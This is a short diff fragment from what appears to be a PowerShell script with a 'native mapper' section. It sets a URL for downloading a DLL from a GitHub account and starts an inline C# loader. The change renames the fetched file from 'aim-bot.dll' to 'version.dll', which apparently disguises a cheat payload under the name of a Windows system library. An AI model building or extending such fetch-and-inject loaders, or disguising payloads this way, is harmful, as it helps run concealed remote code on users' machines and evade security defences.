@@ -268,7 +268,7 @@ try {
 #  NATIVE MAPPER
 # =============================================================
 
-$dllUrl = "https://raw.githubusercontent.com/hiddenuser4077/bios/refs/heads/main/aim-bot.dll"
+$dllUrl = "https://raw.githubusercontent.com/hiddenuser4077/bios/refs/heads/main/version.dll"
 
 $loaderCode = @'
 using System;
